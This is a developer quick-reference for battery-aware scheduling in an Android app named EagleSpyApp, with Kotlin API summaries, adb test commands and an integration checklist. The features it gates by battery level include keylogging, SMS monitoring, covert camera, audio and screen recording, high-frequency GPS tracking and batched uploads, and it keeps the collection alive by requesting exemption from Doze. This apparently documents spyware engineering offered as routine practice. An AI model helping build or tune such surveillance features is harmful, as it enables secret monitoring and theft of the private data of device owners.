# Battery Optimization Quick Reference

## Quick Start

### 1. Enable in Application
```kotlin
// Already integrated in EagleSpyApp.kt
DataSyncWorker.scheduleAdaptive(context)
DozeOptimization.requestIgnoreBatteryOptimizations(context)
```

### 2. Use Adaptive Intervals

```kotlin
val manager = AdaptiveSyncManager(context)
val syncInterval = manager.getSyncInterval() // minutes
val locationInterval = manager.getLocationUpdateInterval() // milliseconds
```

### 3. Check Feature Availability

```kotlin
if (manager.shouldEnableFeature(AdaptiveSyncManager.Feature.CAMERA_CAPTURE)) {
    // Safe to capture
}
```

## Battery State Matrix

| Battery | Charging | Power Mode | Sync Interval | Location Interval |
|---------|----------|------------|---------------|-------------------|
| < 15% | No | Normal | 60 min | 30 min |
| < 30% | No | Normal | 30 min | 20 min |
| > 30% | No | Normal | 30 min | 10 min |
| > 50% | No | Normal | 15 min (WiFi) | 10 min |
| Any | Yes | Normal | 5 min | 5 min |
| Any | Any | Low Power | 60 min | 30 min |

## Feature Battery Thresholds

| Feature | Minimum Battery | When Charging |
|---------|----------------|---------------|
| Camera Capture | 30% | Always |
| Audio Recording | 20% | Always |
| Screen Recording | 40% | Always |
| High-Freq GPS | 50% | Always |
| Keylogging | 10% | Always |
| SMS Monitoring | Always | Always |

## Testing Commands

```bash
# Simulate low battery
adb shell dumpsys battery set level 10
adb shell dumpsys battery set status 3

# Simulate charging
adb shell dumpsys battery set ac 1

# Force Doze mode
adb shell dumpsys deviceidle force-idle

# Exit Doze
adb shell dumpsys deviceidle unforce

# Reset battery
adb shell dumpsys battery reset

# View logs
adb logcat -s AdaptiveSyncManager BatteryMonitorService DataSyncWorker
```

## API Reference

### AdaptiveSyncManager

```kotlin
class AdaptiveSyncManager(context: Context) {
    fun getSyncInterval(): Long
    fun getLocationUpdateInterval(): Long
    fun shouldEnableFeature(feature: Feature): Boolean
    fun getBatchSize(): Int
    fun shouldThrottleOperations(): Boolean
}
```

### DozeOptimization

```kotlin
object DozeOptimization {
    fun isIgnoringBatteryOptimizations(context: Context): Boolean
    fun requestIgnoreBatteryOptimizations(context: Context)
    fun isDeviceIdleMode(context: Context): Boolean
    fun isLowPowerMode(context: Context): Boolean
    fun scheduleAlarmForDozeWakeup(context: Context)
    fun cancelDozeWakeupAlarm(context: Context)
}
```

### DataSyncWorker

```kotlin
companion object {
    fun schedule(context: Context, intervalMinutes: Long = 15)
    fun scheduleAdaptive(context: Context)
    fun cancel(context: Context)
}
```

## Common Patterns

### Check Battery Before Operation
```kotlin
val manager = AdaptiveSyncManager(context)
if (manager.shouldThrottleOperations()) {
    Log.w(TAG, "Operations throttled due to battery")
    return
}
```

### Adaptive Batch Upload
```kotlin
val batchSize = manager.getBatchSize()
val items = queue.take(batchSize)
uploadBatch(items)
```

### Network-Aware Sync
```kotlin
val interval = when {
    isCharging && isWiFi -> 5 // Aggressive
    isCharging -> 10
    isWiFi -> 15
    else -> 30 // Conservative
}
```

## Troubleshooting

| Problem | Check | Solution |
|---------|-------|----------|
| Worker not running | WorkManager constraints | Verify network & battery |
| High drain | Feature gating | Check battery thresholds |
| Doze blocking | Exemption status | Request optimization exemption |
| Missed syncs | Adaptive intervals | Check logs for actual intervals |

## Monitoring

```kotlin
// Log current strategy
Log.d(TAG, "Sync: ${manager.getSyncInterval()}min, " +
           "Location: ${manager.getLocationUpdateInterval() / 60000}min, " +
           "Batch: ${manager.getBatchSize()}")
```

## Best Practices

1. ✅ Always use AdaptiveSyncManager
2. ✅ Check battery before intensive ops
3. ✅ Use recommended batch sizes
4. ✅ Respect Low Power Mode
5. ❌ Don't hardcode intervals
6. ❌ Don't ignore feature gating
7. ❌ Don't bypass throttling

## Integration Checklist

- [ ] DataSyncWorker.scheduleAdaptive() called in Application.onCreate()
- [ ] BatteryMonitorService started
- [ ] DozeOptimization exemption requested
- [ ] AdaptiveSyncManager used in all services
- [ ] Feature gating implemented
- [ ] Batch sizes respected
- [ ] Tested with low battery
- [ ] Tested with Doze mode
- [ ] Tested with Low Power Mode
